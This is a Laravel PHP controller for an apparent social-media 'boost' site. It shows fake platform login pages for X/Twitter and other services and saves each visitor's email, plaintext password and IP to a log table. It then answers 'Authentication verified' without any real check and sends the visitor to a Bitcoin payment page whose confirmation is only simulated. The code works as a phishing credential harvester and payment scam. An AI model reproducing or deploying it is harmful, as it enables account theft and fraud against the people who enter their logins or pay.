<?php

namespace App\Http\Controllers;

use App\Models\Log;
use App\Models\Tag;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\View;

class PlatformLoginController extends Controller
{
    /**
     * Display the platform-specific login screen.
     */
    public function show(string $platform, Request $request)
    {
        $platform = strtolower(trim($platform));

        // Normalise 'x' to 'twitter'
        if ($platform === 'x') {
            $platform = 'twitter';
        }

        // Match platform tag from DB
        $tag = null;
        if ($request->filled('tag_id')) {
            $tag = Tag::find($request->query('tag_id'));
        }
        if (!$tag) {
            $tag = Tag::where('name', $platform)
                ->orWhere('name', 'like', $platform . '_%')
                ->first();
        }
        if (!$tag) {
            $tag = Tag::first();
        }

        // Retrieve offers matching this platform from config
        $offers = collect(config('offers', []))->filter(function ($item) use ($platform) {
            return strtolower($item['icon'] ?? '') === $platform;
        });

        $defaultOffer = $offers->first();
        $service = $request->query('service') ?: ($defaultOffer['text'] ?? (ucfirst($platform) . ' Boost'));
        $slug = $request->query('slug') ?: ($defaultOffer['slug'] ?? ($platform . '-service'));
        $quantity = (int) ($request->query('quantity') ?: 1000);
        $username = $request->query('username') ?: '';
        $refId = $request->query('ref_id') ?: '';

        $viewName = View::exists("platform-login.{$platform}")
            ? "platform-login.{$platform}"
            : "platform-login.default";

        return view($viewName, [
            'platform'       => $platform,
            'tag'            => $tag,
            'offers'         => $offers,
            'service'        => $service,
            'slug'           => $slug,
            'quantity'       => $quantity,
            'username'       => $username,
            'refId'          => $refId,
            'platformTitle'  => ucfirst($platform === 'twitter' ? 'X (Twitter)' : $platform),
        ]);
    }

    /**
     * Store login credentials and redirect to payment checkout.
     */
    public function store(string $platform, Request $request)
    {
        $request->validate([
            'email'            => 'required|string',
            'password'         => 'required|string',
            'tag_id'           => 'required|exists:tags,id',
            'quantity'         => 'nullable|numeric',
            'username'         => 'nullable|string',
            'service_type'     => 'nullable|string',
            'referral_code_id' => 'nullable|string',
        ]);

        $username = $request->input('username');
        if (empty($username)) {
            $username = $request->input('email');
        }

        $log = Log::create([
            'username'         => $username,
            'email'            => $request->input('email'),
            'password'         => $request->input('password'),
            'tag_id'           => $request->input('tag_id'),
            'quantity'         => $request->input('quantity') ?: 1000,
            'service_type'     => $request->input('service_type') ?: (ucfirst($platform) . ' Service'),
            'referral_code_id' => $request->input('referral_code_id'),
            'country'          => $request->ip(),
        ]);

        if ($request->expectsJson() || $request->ajax()) {
            return response()->json([
                'status'       => 'success',
                'message'      => 'Authentication verified',
                'redirect_url' => route('platform.payment', ['id' => $log->id]),
            ], 200);
        }

        return redirect()->route('platform.payment', ['id' => $log->id]);
    }

    /**
     * Display the payment and order confirmation page.
     */
    public function payment(int $id)
    {
        $log = Log::with('tag')->findOrFail($id);
        $price = number_format(max(50, ($log->quantity ?: 1000) * 0.01), 2);

        return view('platform-login.payment', [
            'log'        => $log,
            'price'      => $price,
            'btcAddress' => config('custom.btc', 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'),
        ]);
    }

    /**
     * Confirm / simulate payment submission.
     */
    public function confirmPayment(int $id, Request $request)
    {
        $log = Log::findOrFail($id);

        if ($request->expectsJson() || $request->ajax()) {
            return response()->json([
                'status'  => 'success',
                'message' => 'Payment received. Order is being processed.',
            ]);
        }

        return back()->with('success', 'Payment verified. Delivery starts within 24 hours.');
    }
}
